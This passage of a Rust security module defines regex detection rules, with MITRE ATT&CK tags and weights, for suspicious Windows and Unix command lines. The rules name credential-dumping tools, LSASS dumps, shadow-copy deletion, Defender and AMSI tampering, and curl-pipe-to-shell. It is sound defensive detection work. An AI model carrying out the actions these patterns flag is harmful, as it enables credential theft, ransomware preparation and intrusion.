//! Suspicious command-line analysis.
//!
//! Deterministic heuristics over a process command line (and, via
//! [`analyze_process`], the process tree): LOLBin abuse, credential theft,
//! recovery inhibition, persistence, discovery, obfuscation (carets,
//! backticks, string concatenation, `[char]` codes, env-var substrings,
//! random case), high-entropy tokens, PowerShell `-EncodedCommand` and base64
//! literals (decoded — UTF-16LE aware — and analysed recursively), download
//! cradles, and suspicious parent/child relationships.
//!
//! Each finding has a weight (0–100) and optional ATT&CK techniques; the
//! overall score combines weights as a noisy-OR
//! (`100 * (1 - Π(1 - w/100))`), so it is bounded, explainable and
//! monotonic: adding a finding never lowers the score.

use std::collections::BTreeSet;
use std::sync::LazyLock;

use base64::Engine;
use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use regex::Regex;
use serde::Serialize;

use crate::alert::AlertFields;
use crate::common::{Severity, re, truncate_chars};

/// Maximum command-line length analysed (longer input is truncated).
pub const MAX_ANALYZED_LEN: usize = 256 * 1024;
/// Maximum decoded payload text kept per payload.
const MAX_DECODED_KEEP: usize = 4096;
/// Maximum recursion depth for decoded payloads.
const MAX_DEPTH: usize = 2;
/// Maximum decoded payloads per analysis (bounds work on adversarial input).
const MAX_PAYLOADS: usize = 8;

/// One heuristic hit.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct CmdFinding {
    /// Stable rule id (`certutil_download`).
    pub id: String,
    /// Human-readable title.
    pub title: String,
    /// Severity implied by the weight.
    pub severity: Severity,
    /// Weight 0–100 used in the score.
    pub weight: u8,
    /// ATT&CK technique ids.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub techniques: Vec<String>,
    /// Matched snippet.
    pub evidence: String,
}

/// A decoded payload found in the command line.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct DecodedPayload {
    /// How it was found (`powershell -EncodedCommand`, `base64 literal`).
    pub method: String,
    /// Length of the encoded string.
    pub encoded_length: usize,
    /// Decoded text (truncated).
    pub text: String,
    /// `true` when `text` was truncated.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub truncated: bool,
}

/// Result of [`analyze_command_line`] / [`analyze_process`].
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct CommandLineAnalysis {
    /// Risk score 0–100 (noisy-OR of finding weights).
    pub score: u8,
    /// Severity band of the score.
    pub severity: Severity,
    /// Executable (basename, lowercase) of the command line.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub executable: Option<String>,
    /// Command-line length in characters.
    pub length: usize,
    /// Shannon entropy (bits/char) of the command line.
    pub entropy: f64,
    /// Findings, highest weight first.
    pub findings: Vec<CmdFinding>,
    /// Decoded payloads.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub decoded: Vec<DecodedPayload>,
    /// Union of finding techniques, sorted.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub techniques: Vec<String>,
}

impl CommandLineAnalysis {
    /// `true` when nothing was found.
    pub fn is_clean(&self) -> bool {
        self.findings.is_empty()
    }

    /// Short verdict hint for prompts.
    pub fn verdict_hint(&self) -> &'static str {
        match self.score {
            0..=14 => "no suspicious traits",
            15..=39 => "minor suspicious traits",
            40..=69 => "suspicious",
            _ => "likely malicious",
        }
    }
}

/// Process context for [`analyze_process`].
#[derive(Debug, Clone, Copy, Default)]
pub struct ProcessContext<'a> {
    /// Process image path.
    pub image: Option<&'a str>,
    /// Parent image path.
    pub parent_image: Option<&'a str>,
    /// Command line.
    pub command_line: Option<&'a str>,
    /// Parent command line.
    pub parent_command_line: Option<&'a str>,
}

impl<'a> ProcessContext<'a> {
    /// Borrow the process fields of an alert.
    pub fn from_fields(f: &'a AlertFields) -> Self {
        Self {
            image: f.image.as_deref(),
            parent_image: f.parent_image.as_deref(),
            command_line: f.command_line.as_deref(),
            parent_command_line: f.parent_command_line.as_deref(),
        }
    }
}

struct Rule {
    id: &'static str,
    title: &'static str,
    weight: u8,
    techniques: &'static [&'static str],
    pattern: &'static str,
}

const fn r(
    id: &'static str,
    title: &'static str,
    weight: u8,
    techniques: &'static [&'static str],
    pattern: &'static str,
) -> Rule {
    Rule {
        id,
        title,
        weight,
        techniques,
        pattern,
    }
}

static RULES: &[Rule] = &[
    // --- PowerShell -------------------------------------------------------
    r(
        "ps_download_cradle",
        "Download cradle (remote file/script retrieval)",
        45,
        &["T1105"],
        r"(?i)net\.webclient|\bdownload(?:string|file|data)\b|\bopenread\s*\(|invoke-webrequest|invoke-restmethod|\biwr\s|\birm\s|start-bitstransfer|net\.http\.httpclient|\bwget(?:\.exe)?\s[^\r\n]*?https?://|\bcurl(?:\.exe)?\s[^\r\n]*?https?://",
    ),
    r(
        "ps_iex",
        "Invoke-Expression of dynamic content",
        30,
        &["T1059.001"],
        r"(?i)\biex\b|invoke-expression",
    ),
    r(
        "ps_exec_bypass",
        "PowerShell execution policy bypass",
        15,
        &["T1059.001"],
        r"(?i)\s[-/](?:ep|ex|exe|exec|executionpolicy)\s+(?:bypass|unrestricted)\b",
    ),
    r(
        "ps_hidden_window",
        "Hidden window",
        20,
        &["T1564.003"],
        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*?\s[-/]w(?:i(?:n(?:d(?:o(?:w(?:s(?:t(?:y(?:l(?:e)?)?)?)?)?)?)?)?)?)?\s+(?:h(?:i(?:d(?:d(?:e(?:n)?)?)?)?)?|1)\b|-windowstyle\s+hidden",
    ),
    r(
        "ps_noprofile",
        "PowerShell -NoProfile",
        5,
        &[],
        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*?\s[-/]nop(?:rofile)?\b",
    ),
    r(
        "ps_noninteractive",
        "PowerShell -NonInteractive",
        5,
        &[],
        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*?\s[-/]noni(?:nteractive)?\b",
    ),
    r(
        "ps_downgrade",
        "PowerShell v2 downgrade (evades script-block logging and AMSI)",
        40,
        &["T1562"],
        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*?\s-v(?:ersion)?\s+2(?:\.0)?\b",
    ),
    r(
        "amsi_bypass",
        "AMSI bypass",
        75,
        &["T1562.001"],
        r"(?i)amsiutils|amsiinitfailed|amsiscanbuffer|amsicontext",
    ),
    r(
        "defender_tamper",
        "Microsoft Defender tampering",
        60,
        &["T1562.001"],
        r"(?i)(?:set|add)-mppreference[^\r\n]*?-(?:disable\w*|exclusion\w*)|disableantispyware|disablerealtimemonitoring|disablebehaviormonitoring|disableioavprotection|disablescriptscanning|mpcmdrun(?:\.exe)?\b[^\r\n]*?-removedefinitions",
    ),
    r(
        "reflective_load",
        "In-memory assembly loading / shellcode APIs",
        45,
        &["T1620"],
        r"(?i)reflection\.assembly\]::load|assembly\]::load(?:file|from)?\s*\(|virtualalloc|virtualprotect|getdelegateforfunctionpointer|createremotethread",
    ),
    r(
        "frombase64",
        "Base64 decoding in the command",
        25,
        &["T1140"],
        r"(?i)frombase64string|\bbase64\s+(?:-d|--decode)\b",
    ),
    r(
        "compressed_payload",
        "Compressed (Gzip/Deflate) inline payload",
        40,
        &["T1027"],
        r"(?i)gzipstream|deflatestream|io\.compression\.compressionmode",
    ),
    r(
        "xor_decode",
        "XOR decoding routine",
        35,
        &["T1027"],
        r"(?i)-bxor\b",
    ),
    // --- LOLBins ----------------------------------------------------------
    r(
        "certutil_download",
        "certutil used to download a file",
        60,
        &["T1105"],
        r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?[-/](?:urlcache|verifyctl)\b",
    ),
    r(
        "certutil_decode",
        "certutil used to decode/encode a file",
        45,
        &["T1140"],
        r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?[-/](?:decode|decodehex|encode)\b",
    ),
    r(
        "mshta_remote",
        "mshta executing remote or inline script",
        60,
        &["T1218.005"],
        r"(?i)\bmshta(?:\.exe)?\b[^\r\n]*?(?:https?://|javascript:|vbscript:|\.hta\b)",
    ),
    r(
        "mshta_exec",
        "mshta execution",
        20,
        &["T1218.005"],
        r"(?i)\bmshta(?:\.exe)?\b",
    ),
    r(
        "rundll32_script",
        "rundll32 executing script (RunHTMLApplication)",
        70,
        &["T1218.011"],
        r"(?i)\brundll32(?:\.exe)?\b[^\r\n]*?(?:javascript:|vbscript:|runhtmlapplication)",
    ),
    r(
        "rundll32_user_path",
        "rundll32 loading a DLL from a user-writable path",
        45,
        &["T1218.011"],
        r"(?i)\brundll32(?:\.exe)?\b[^\r\n]*?(?:\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|\\downloads\\|\\perflogs\\)",
    ),
    r(
        "rundll32_exec",
        "rundll32 proxy execution",
        10,
        &["T1218.011"],
        r"(?i)\brundll32(?:\.exe)?\b",
    ),
    r(
        "lsass_dump_comsvcs",
        "LSASS dump via comsvcs.dll MiniDump",
        90,
        &["T1003.001"],
        r"(?i)comsvcs(?:\.dll)?[^\r\n]*?(?:minidump|#\s*\+?24\b)",
    ),
    r(
        "procdump_lsass",
        "ProcDump against LSASS",
        90,
        &["T1003.001"],
        r"(?i)\bprocdump(?:64)?(?:\.exe)?\b[^\r\n]*?\blsass\b",
    ),
    r(
        "regsvr32_scriptlet",
        "regsvr32 scriptlet execution (Squiblydoo)",
        75,
        &["T1218.010"],
        r#"(?i)\bregsvr32(?:\.exe)?\b[^\r\n]*?(?:[-/]i:\s*["']?https?://|scrobj(?:\.dll)?)"#,
    ),
    r(
        "regsvr32_user_path",
        "regsvr32 registering a DLL from a user-writable path",
        40,
        &["T1218.010"],
        r"(?i)\bregsvr32(?:\.exe)?\b[^\r\n]*?(?:\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|\\downloads\\)",
    ),
    r(
        "bitsadmin_transfer",
        "bitsadmin job / transfer",
        50,
        &["T1197", "T1105"],
        r"(?i)\bbitsadmin(?:\.exe)?\b[^\r\n]*?/(?:transfer|addfile|setnotifycmdline|create)\b",
    ),
    r(
        "wmic_process_create",
        "WMIC process call create",
        50,
        &["T1047"],
        r"(?i)\bwmic(?:\.exe)?\b[^\r\n]*?\bprocess\s+call\s+create\b",
    ),
    r(
        "wmic_remote",
        "WMIC against a remote node",
        40,
        &["T1047"],
        r"(?i)\bwmic(?:\.exe)?\b[^\r\n]*?/node:",
    ),
    r(
        "wmic_xsl",
        "WMIC XSL script processing",
        65,
        &["T1220"],
        r#"(?i)\bwmic(?:\.exe)?\b[^\r\n]*?/format:\s*["']?(?:https?://|[^\s"']*\.xsl\b)"#,
    ),
    r(
        "msiexec_remote",
        "msiexec installing a remote package",
        50,
        &["T1218.007"],
        r"(?i)\bmsiexec(?:\.exe)?\b[^\r\n]*?(?:https?://|\\\\[^\\\s]+\\)",
    ),
    r(
        "regasm_regsvcs",
        "Regasm/Regsvcs proxy execution",
        35,
        &["T1218.009"],
        r"(?i)\b(?:regasm|regsvcs)(?:\.exe)?\b",
    ),
    r(
        "installutil",
        "InstallUtil proxy execution",
        50,
        &["T1218.004"],
        r"(?i)\binstallutil(?:\.exe)?\b[^\r\n]*?(?:/u\b|/logfile=|/logtoconsole=false)",
    ),
    r(
        "msbuild_user_path",
        "MSBuild building a project from a user-writable path",
        45,
        &["T1127.001"],
        r"(?i)\bmsbuild(?:\.exe)?\b[^\r\n]*?(?:\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|\\downloads\\)",
    ),
    r(
        "cmstp",
        "CMSTP proxy execution",
        55,
        &["T1218.003"],
        r"(?i)\bcmstp(?:\.exe)?\b[^\r\n]*?/(?:s|ns|au)\b",
    ),
    r(
        "odbcconf",
        "Odbcconf proxy execution",
        50,
        &["T1218.008"],
        r"(?i)\bodbcconf(?:\.exe)?\b[^\r\n]*?(?:/a\s*\{?\s*regsvr|[-/]f\s|\.rsp\b)",
    ),
    r(
        "mavinject",
        "Mavinject DLL injection",
        70,
        &["T1218.013", "T1055.001"],
        r"(?i)\bmavinject(?:32|64)?(?:\.exe)?\b[^\r\n]*?/injectrunning",
    ),
    r(
        "control_cpl",
        "Control Panel item execution",
        15,
        &["T1218.002"],
        r"(?i)\bcontrol(?:\.exe)?\b[^\r\n]*?\.cpl\b",
    ),
    r(
        "hh_remote",
        "Compiled HTML Help execution",
        40,
        &["T1218.001"],
        r"(?i)\bhh(?:\.exe)?\b[^\r\n]*?(?:https?://|\.chm\b)",
    ),
    r(
        "forfiles_exec",
        "Indirect command execution via forfiles",
        30,
        &["T1202"],
        r"(?i)\bforfiles(?:\.exe)?\b[^\r\n]*?/c\b",
    ),
    r(
        "pcalua_exec",
        "Indirect command execution via pcalua",
        35,
        &["T1202"],
        r"(?i)\bpcalua(?:\.exe)?\b[^\r\n]*?-a\b",
    ),
    r(
        "verclsid",
        "Verclsid proxy execution",
        40,
        &["T1218.012"],
        r"(?i)\bverclsid(?:\.exe)?\b[^\r\n]*?/s\b[^\r\n]*?/c\b",
    ),
    r(
        "wsh_vbscript",
        "Windows Script Host running VBScript",
        25,
        &["T1059.005"],
        r"(?i)\b[wc]script(?:\.exe)?\b[^\r\n]*?\.(?:vbs|vbe|wsf)\b",
    ),
    r(
        "wsh_jscript",
        "Windows Script Host running JScript",
        25,
        &["T1059.007"],
        r"(?i)\b[wc]script(?:\.exe)?\b[^\r\n]*?\.(?:js|jse)\b",
    ),
    r(
        "encoded_script",
        "Encoded script file (.jse/.vbe)",
        45,
        &["T1027"],
        r"(?i)\.(?:jse|vbe)\b",
    ),
    // --- Impact / anti-recovery -------------------------------------------
    r(
        "shadow_copy_delete",
        "Volume shadow copy deletion",
        90,
        &["T1490"],
        r"(?i)\bvssadmin(?:\.exe)?\b[^\r\n]*?\bdelete\s+shadows\b|\bwmic(?:\.exe)?\b[^\r\n]*?\bshadowcopy\b[^\r\n]*?\bdelete\b|win32_shadowcopy[^\r\n]*?(?:delete|remove-(?:cim|wmi)\w*)",
    ),
    r(
        "shadow_storage_resize",
        "Shadow storage resized (shadow copy destruction)",
        60,
        &["T1490"],
        r"(?i)\bvssadmin(?:\.exe)?\b[^\r\n]*?\bresize\s+shadowstorage\b",
    ),
    r(
        "backup_catalog_delete",
        "Backup catalog deletion",
        85,
        &["T1490"],
        r"(?i)\bwbadmin(?:\.exe)?\b[^\r\n]*?\bdelete\s+(?:catalog|systemstatebackup|backup)\b",
    ),
    r(
        "bcdedit_recovery_off",
        "Boot recovery disabled",
        80,
        &["T1490"],
        r"(?i)\bbcdedit(?:\.exe)?\b[^\r\n]*?(?:recoveryenabled\s+(?:no|off|false)|bootstatuspolicy\s+ignoreallfailures)",
    ),
    r(
        "clear_event_logs",
        "Windows event logs cleared",
        75,
        &["T1070.001"],
        r"(?i)\bwevtutil(?:\.exe)?\b[^\r\n]*?\b(?:cl|clear-log)\b|clear-eventlog|remove-eventlog|globalsession\.clearlog",
    ),
    r(
        "usn_journal_delete",
        "USN journal deleted",
        60,
        &["T1070"],
        r"(?i)\bfsutil(?:\.exe)?\b[^\r\n]*?usn\s+deletejournal",
    ),
    r(
        "cipher_wipe",
        "Free space wiped (cipher /w)",
        45,
        &["T1485"],
        r"(?i)\bcipher(?:\.exe)?\b[^\r\n]*?/w:",
    ),
    r(
        "sdelete",
        "Secure deletion tool",
        35,
        &["T1070.004"],
        r"(?i)\bsdelete(?:64)?(?:\.exe)?\b",
    ),
    r(
        "stop_security_service",
        "Security tool / logging service stopped or disabled",
        65,
        &["T1562.001"],
        r"(?i)(?:\bnet1?(?:\.exe)?\s+stop|\bsc(?:\.exe)?\s+(?:stop|delete|config)|stop-service|set-service|\btaskkill(?:\.exe)?\b[^\r\n]*?/im)[^\r\n]*?\b(?:windefend|msmpeng(?:\.exe)?|sense|wscsvc|wdnissvc|sysmon64|sysmon|mpssvc|eventlog|sophos\w*|mcafee\w*|symantec\w*|csfalcon\w*|sentinel\w*|cbdefense|cylance\w*)\b",
    ),
    r(
        "stop_backup_service",
        "Backup / database services stopped (pre-encryption)",
        50,
        &["T1489"],
        r"(?i)(?:\bnet1?(?:\.exe)?\s+stop|\bsc(?:\.exe)?\s+(?:stop|config)|stop-service|\btaskkill(?:\.exe)?\b[^\r\n]*?/im)[^\r\n]*?\b(?:vss|wbengine|sql\w*|mssql\w*|veeam\w*|backup\w*|msexchange\w*|oracle\w*)\b",
    ),
    r(
        "stop_service",
        "Service stopped",
        15,
        &["T1489"],
        r"(?i)\bnet1?(?:\.exe)?\s+stop\b|\bsc(?:\.exe)?\s+stop\b|stop-service\b",
    ),
    // --- Scheduled tasks / services / registry persistence -----------------
    r(
        "schtasks_create",
        "Scheduled task created",
        35,
        &["T1053.005"],
        r"(?i)\bschtasks(?:\.exe)?\b[^\r\n]*?/create\b",
    ),
    r(
        "schtasks_suspicious",
        "Scheduled task with SYSTEM/boot trigger or suspicious payload",
        55,
        &["T1053.005"],
        r#"(?i)\bschtasks(?:\.exe)?\b[^\r\n]*?/create\b[^\r\n]*?(?:/ru\s+["']?(?:nt authority\\)?system\b|/sc\s+(?:onlogon|onstart|onidle)\b|powershell|\\appdata\\|\\temp\\|\\users\\public\\|mshta|rundll32|regsvr32|https?://)"#,
    ),
    r(
        "service_create",
        "Service created or reconfigured",
        40,
        &["T1543.003"],
        r"(?i)\bsc(?:\.exe)?\s+(?:\\\\\S+\s+)?create\b|\bnew-service\b|\bsc(?:\.exe)?\s+(?:\\\\\S+\s+)?config\b[^\r\n]*?binpath\s*=",
    ),
    r(
        "run_key_persistence",
        "Registry Run key persistence",
        55,
        &["T1547.001"],
        r"(?i)(?:\breg(?:\.exe)?\s+add|set-itemproperty|new-itemproperty)[^\r\n]*?\\currentversion\\(?:run|runonce|runservices|policies\\explorer\\run)\b",
    ),
    r(
        "winlogon_persistence",
        "Winlogon helper persistence",
        60,
        &["T1547.004"],
        r"(?i)(?:\breg(?:\.exe)?\s+add|set-itemproperty|new-itemproperty)[^\r\n]*?\\winlogon\b[^\r\n]*?\b(?:userinit|shell|notify)\b",
    ),
    r(
        "ifeo_injection",
        "Image File Execution Options debugger hijack",
        65,
        &["T1546.012"],
        r"(?i)image file execution options\\[^\r\n]*?\b(?:debugger|globalflag)\b",
    ),
    r(
        "accessibility_backdoor",
        "Accessibility feature backdoor (sticky keys etc.)",
        80,
        &["T1546.008"],
        r"(?i)image file execution options\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe|\b(?:copy|move|xcopy)\b[^\r\n]*?\b(?:cmd|powershell)\.exe[^\r\n]*?\\(?:sethc|utilman|osk|magnify|narrator)\.exe",
    ),
    r(
        "reg_modify",
        "Registry modification via reg.exe",
        10,
        &["T1112"],
        r"(?i)\breg(?:\.exe)?\s+(?:add|delete|import)\b",
    ),
    r(
        "uac_bypass_registry",
        "UAC bypass via shell-handler hijack",
        70,
        &["T1548.002"],
        r"(?i)\\(?:ms-settings|mscfile|exefile|folder)\\shell\\open\\command|delegateexecute",
    ),
    r(
        "uac_bypass_binary",
        "Auto-elevating binary often abused for UAC bypass",
        25,
        &["T1548.002"],
        r"(?i)\b(?:fodhelper|computerdefaults|sdclt|wsreset)(?:\.exe)?\b",
    ),
    // --- Credential access -------------------------------------------------
    r(
        "mimikatz",
        "Mimikatz / credential theft tooling",
        95,
        &["T1003"],
        r"(?i)sekurlsa::|lsadump::|kerberos::(?:golden|ptt|list)|privilege::debug|dpapi::|token::elevate|invoke-mimikatz|\bmimikatz\b",
    ),
    r(
        "ntds_dump",
        "NTDS.dit extraction",
        85,
        &["T1003.003"],
        r"(?i)\bntdsutil(?:\.exe)?\b[^\r\n]*?(?:\bifm\b|ac(?:tivate)?\s+i(?:nstance)?\s+ntds)|\\ntds\.dit\b",
    ),
    r(
        "reg_save_hives",
        "SAM/SYSTEM/SECURITY hive export",
        75,
        &["T1003.002"],
        r#"(?i)\breg(?:\.exe)?\s+(?:save|export)\s+["']?hk(?:lm|ey_local_machine)\\(?:sam|system|security)\b"#,
    ),
    r(
        "kerberoast",
        "Kerberoasting",
        85,
        &["T1558.003"],
        r"(?i)invoke-kerberoast|\bkerberoast\b|getuserspns",
    ),
    r(
        "asreproast",
        "AS-REP roasting",
        85,
        &["T1558.004"],
        r"(?i)\basreproast\b|get-npusers|getnpusers",
    ),
    r(
        "rubeus",
        "Rubeus Kerberos abuse",
        85,
        &["T1558"],
        r"(?i)\brubeus(?:\.exe)?\b[^\r\n]*?\b(?:asktgt|asktgs|s4u|ptt|dump|tgtdeleg|golden|silver|monitor|harvest|kerberoast|asreproast)\b",
    ),
    r(
        "browser_credential_access",
        "Browser credential/cookie store access",
        55,
        &["T1555.003"],
        r"(?i)\\(?:google\\chrome|microsoft\\edge|bravesoftware\\brave-browser)\\user data\\[^\r\n]*?\\(?:login data|cookies|local state)\b|\\mozilla\\firefox\\profiles\\[^\r\n]*?(?:logins\.json|key4\.db|cookies\.sqlite)",
    ),
    r(
        "credential_manager",
        "Credential Manager enumeration",
        30,
        &["T1555.004"],
        r"(?i)\bcmdkey(?:\.exe)?\s+/list\b|\bvaultcmd(?:\.exe)?\b[^\r\n]*?/list",
    ),
    r(
        "password_search",
        "Searching files for passwords",
        35,
        &["T1552.001"],
        r"(?i)\bfindstr(?:\.exe)?\b[^\r\n]*?\bpass(?:word|wd)?\b|select-string[^\r\n]*?pass(?:word|wd)|\bgrep\b[^\r\n]*?\s-[a-z]*r[a-z]*\b[^\r\n]*?pass(?:word|wd)",
    ),
    r(
        "registry_password_search",
        "Searching the registry for passwords",
        40,
        &["T1552.002"],
        r"(?i)\breg(?:\.exe)?\s+query\b[^\r\n]*?/f\s+pass(?:word)?\b",
    ),
    r(
        "lazagne",
        "LaZagne credential recovery",
        85,
        &["T1555"],
        r"(?i)\blazagne(?:\.exe)?\b",
    ),
    r(
        "pipe_impersonation",
        "Named-pipe impersonation (getsystem)",
        80,
        &["T1134.001"],
        r"(?i)\bcmd(?:\.exe)?\b[^\r\n]*?/c\s+echo\s+\S+\s*>\s*\\\\\.\\pipe\\",
    ),
    // --- Accounts / discovery ---------------------------------------------
    r(
        "net_user_add",
        "Account created with net user /add",
        50,
        &["T1136"],
        r"(?i)\bnet1?(?:\.exe)?\s+user\s+[^\r\n]*?\s/add\b",
    ),
    r(
        "net_group_add",
        "User added to a group",
        55,
        &["T1098"],
        r"(?i)\bnet1?(?:\.exe)?\s+(?:localgroup|group)\s+[^\r\n]*?\s/add\b",
    ),
    r(
        "net_user_enum",
        "Account enumeration (net user)",
        15,
        &["T1087"],
        r"(?i)\bnet1?(?:\.exe)?\s+user\b",
    ),
    r(
        "net_group_enum",
        "Group enumeration (net group/localgroup)",
        15,
        &["T1069"],
        r"(?i)\bnet1?(?:\.exe)?\s+(?:localgroup|group)\b",
    ),
    r(
        "net_priv_group_enum",
        "Privileged domain group enumeration",
        35,
        &["T1069.002"],
        r#"(?i)\bnet1?(?:\.exe)?\s+group\s+["']?(?:domain admins|enterprise admins|schema admins)"#,
    ),
    r(
        "net_view",
        "Remote system / share discovery (net view)",
        15,
        &["T1018", "T1135"],
        r"(?i)\bnet1?(?:\.exe)?\s+view\b",
    ),
    r(
        "net_use_admin_share",
        "Admin share mapped",
        40,
        &["T1021.002"],
        r"(?i)\bnet1?(?:\.exe)?\s+use\s+\\\\[^\s\\]+\\(?:[a-z]\$|admin\$|ipc\$)",
    ),
    r(
        "whoami_detailed",
        "Privilege/group discovery (whoami /all|/priv|/groups)",
        20,
        &["T1033"],
        r"(?i)\bwhoami(?:\.exe)?\s+/(?:all|priv|groups)\b",
    ),
    r(
        "whoami",
        "User discovery (whoami)",
        8,
        &["T1033"],
        r"(?i)\bwhoami(?:\.exe)?\b",
    ),
    r(
        "systeminfo",
        "System information discovery",
        8,
        &["T1082"],
        r"(?i)\bsysteminfo(?:\.exe)?\b",
    ),
    r(
        "ipconfig_all",
        "Network configuration discovery",
        8,
        &["T1016"],
        r"(?i)\bipconfig(?:\.exe)?\s+/all\b",
    ),
    r(
        "netstat",
        "Network connections discovery",
        8,
        &["T1049"],
        r"(?i)\bnetstat(?:\.exe)?\s+-[a-z]*a",
    ),
    r(
        "tasklist",
        "Process discovery",
        8,
        &["T1057"],
        r"(?i)\btasklist(?:\.exe)?\b",
    ),
    r(
        "query_user",
        "Logged-on user discovery",
        8,
        &["T1033"],
        r"(?i)\bquser(?:\.exe)?\b|\bquery\s+user\b",
    ),
    r(
        "arp_cache",
        "ARP cache discovery",
        8,
        &["T1018"],
        r"(?i)\barp(?:\.exe)?\s+-a\b",
    ),
    r(
        "reg_query",
        "Registry query",
        8,
        &["T1012"],
        r"(?i)\breg(?:\.exe)?\s+query\b",
    ),
    r(
        "sc_query",
        "Service discovery",
        8,
        &["T1007"],
        r"(?i)\bsc(?:\.exe)?\s+query(?:ex)?\b",
    ),
    r(
        "nltest_trusts",
        "Domain trust / DC discovery (nltest)",
        40,
        &["T1482"],
        r"(?i)\bnltest(?:\.exe)?\b[^\r\n]*?/(?:domain_trusts|dclist|dsgetdc|all_trusts|trusted_domains)",
    ),
    r(
        "adfind",
        "AdFind Active Directory reconnaissance",
        55,
        &["T1087.002", "T1482"],
        r"(?i)\badfind(?:\.exe)?\b",
    ),
    r(
        "dsquery",
        "dsquery Active Directory enumeration",
        25,
        &["T1087.002"],
        r"(?i)\bdsquery(?:\.exe)?\b",
    ),
    r(
        "bloodhound",
        "BloodHound/SharpHound AD collection",
        80,
        &["T1087.002", "T1482"],
        r"(?i)sharphound|invoke-bloodhound|azurehound|\s-collectionmethods?\b",
    ),
    r(
        "security_software_discovery",
        "Security software discovery",
        25,
        &["T1518.001"],
        r"(?i)get-mpcomputerstatus|antivirusproduct|root\\securitycenter2",
    ),
    // --- Network / firewall / lateral movement ----------------------------
    r(
        "firewall_disable",
        "Firewall disabled",
        65,
        &["T1562.004"],
        r"(?i)\bnetsh(?:\.exe)?\b[^\r\n]*?(?:advfirewall\s+set\s+\S+\s+state\s+off|firewall\s+set\s+opmode\s+(?:mode=)?disable)|set-netfirewallprofile[^\r\n]*?-enabled\s+(?:false|0|\$false)",
    ),
    r(
        "firewall_rule_add",
        "Firewall rule added",
        30,
        &["T1562.004"],
        r"(?i)\bnetsh(?:\.exe)?\b[^\r\n]*?(?:advfirewall\s+firewall\s+add\s+rule|firewall\s+add\s+(?:allowedprogram|portopening))|new-netfirewallrule",
    ),
    r(
        "portproxy",
        "netsh port proxy (traffic tunnelling)",
        55,
        &["T1090"],
        r"(?i)\bnetsh(?:\.exe)?\b[^\r\n]*?interface\s+portproxy\s+add",
    ),
    r(
        "psexec",
        "PsExec-style remote execution",
        40,
        &["T1569.002", "T1021.002"],
        r"(?i)\b(?:psexec|psexec64|paexec|psexesvc)(?:\.exe)?\b",
    ),
    r(
        "winrm_remote",
        "Remote PowerShell / WinRM execution",
        35,
        &["T1021.006"],
        r"(?i)\bwinrs(?:\.exe)?\b[^\r\n]*?[-/]r(?:emote)?:|invoke-command[^\r\n]*?-computername|enter-pssession|new-pssession",
    ),
    r(
        "wmi_remote_ps",
        "WMI/CIM process creation from PowerShell",
        45,
        &["T1047"],
        r"(?i)invoke-(?:wmi|cim)method[^\r\n]*?win32_process",
    ),
    // --- Staging / hiding --------------------------------------------------
    r(
        "archive_password",
        "Password-protected archive created (staging)",
        40,
        &["T1560.001"],
        r"(?i)\b(?:7z|7za|7zr|rar|winrar)(?:\.exe)?\s+a\b[^\r\n]*?\s-(?:p|hp)\S*",
    ),
    r(
        "archive_create",
        "Archive created",
        15,
        &["T1560.001"],
        r"(?i)\b(?:7z|7za|7zr|rar|winrar)(?:\.exe)?\s+a\b|compress-archive\b|\btar\s+-?c[zjJ]?v?f\b",
    ),
    r(
        "attrib_hide",
        "File hidden with attrib +h",
        25,
        &["T1564.001"],
        r"(?i)\battrib(?:\.exe)?\b[^\r\n]*?\+h\b",
    ),
    r(
        "icacls_everyone",
        "Permissions granted to Everyone",
        30,
        &["T1222.001"],
        r"(?i)\bicacls(?:\.exe)?\b[^\r\n]*?/grant\b[^\r\n]*?(?:everyone|\*?s-1-1-0)",
    ),
    r(
        "takeown",
        "File ownership taken",
        15,
        &["T1222.001"],
        r"(?i)\btakeown(?:\.exe)?\b[^\r\n]*?/f\b",
    ),
    r(
        "double_extension",
        "Double file extension",
        55,
        &["T1036.007"],
        r"(?i)\.(?:pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|txt|rtf|zip|rar)\.(?:exe|scr|com|pif|bat|cmd|js|jse|vbs|vbe|hta|ps1|lnk|msi)\b",
    ),
    r(
        "user_writable_reference",
        "References a user-writable / temporary location",
        20,
        &[],
        r#"(?i)\\appdata\\local\\temp\\|\\users\\public\\|\\windows\\temp\\|\\\$recycle\.bin\\|\\perflogs\\|\\programdata\\[^\\\s"]+\.(?:exe|dll|ps1|bat|cmd|vbs|js|hta)\b|\\downloads\\[^\\\s"]+\.(?:exe|scr|dll|ps1|bat|cmd|vbs|js|hta)\b"#,
    ),
    // --- Obfuscation -------------------------------------------------------
    r(
        "env_var_obfuscation",
        "Environment-variable substring obfuscation",
        45,
        &["T1027.010"],
        r"(?i)%[a-z_]+:~-?\d+(?:,-?\d+)?%",
    ),
    r(
        "format_obfuscation",
        "Format-operator string obfuscation",
        45,
        &["T1027.010"],
        r#"(?i)["'](?:\{\d+\}){3,}[^"']*["']\s*-f\b"#,
    ),
    r(
        "reverse_string",
        "String reversal obfuscation",
        40,
        &["T1027.010"],
        r"(?i)\[array\]::reverse|\[\s*-1\s*\.\.\s*-",
    ),
    // --- Unix ---------------------------------------------------------------
    r(
        "pipe_to_shell",
        "Remote script piped to a shell",
        70,
        &["T1105", "T1059.004"],
        r"(?i)\b(?:curl|wget)\b[^\r\n|]*\|\s*(?:sudo\s+)?(?:ba|da|z|k)?sh\b",
    ),
    r(
        "reverse_shell",
        "Reverse shell",
        90,
        &["T1059.004"],
